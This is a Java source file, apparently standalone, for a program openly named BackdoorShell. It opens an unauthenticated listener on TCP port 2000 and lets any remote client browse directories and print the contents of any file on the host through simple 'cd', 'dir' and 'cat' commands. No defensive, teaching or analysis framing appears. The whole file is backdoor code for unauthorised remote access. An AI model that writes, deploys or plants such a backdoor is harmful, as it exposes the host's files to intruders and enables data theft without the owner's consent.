import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;

public class BackdoorShell {
    public static void main(String[] args) {
        try {
            ServerSocket server = new ServerSocket(2000);
            System.out.println("Backdoor shell server started on port 2000");

            while (true) {
                Socket client = server.accept();
                System.out.println("Client connected from " + client.getInetAddress().getHostAddress());
                InputStream in = client.getInputStream();
                OutputStream out = client.getOutputStream();

                BufferedReader reader = new BufferedReader(new InputStreamReader(in));
                PrintWriter writer = new PrintWriter(out, true);

                File currentDir = new File(".");

                writer.print(currentDir.getAbsolutePath() + "> ");
                writer.flush();

                while (true) {
                    String line = reader.readLine().trim();

                    if (line.equals("")) {
                        writer.print(currentDir.getAbsolutePath() + "> ");
                        writer.flush();
                        continue;
                    }

                    String[] tokens = line.split("\\s+");
                    String command = tokens[0];

                    if (command.equals("cd")) {
                        String path = tokens.length > 1 ? tokens[1] : System.getProperty("user.home");
                        File newPath = new File(currentDir, path);
                        if (newPath.isDirectory()) {
                            currentDir = newPath;
                        } else {
                            writer.println("Directory not found: " + newPath.getAbsolutePath());
                        }
                    } else if (command.equals("dir")) {
                        File[] files = currentDir.listFiles();
                        writer.println("List of files in " + currentDir.getAbsolutePath());
                        for (File file : files) {
                            String type = file.isDirectory() ? "Directory" : "File";
                            writer.println(file.getName() + " - " + type);
                        }
                        writer.println(files.length + " files in total");
                    } else if (command.equals("cat")) {
                        if (tokens.length > 1) {
                            String filename = tokens[1];
                            File file = new File(currentDir, filename);
                            if (file.exists()) {
                                BufferedReader fileReader = new BufferedReader(new FileReader(file));
                                String line2;
                                while ((line2 = fileReader.readLine()) != null) {
                                    writer.println(line2);
                                }
                                fileReader.close();
                            } else {
                                writer.println("File not found: " + file.getAbsolutePath());
                            }
                        } else {
                            writer.println("Usage: cat <filename>");
                        }
                    } else {
                        writer.println("Unknown command: " + command);
                    }

                    writer.print(currentDir.getAbsolutePath() + "> ");
                    writer.flush();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
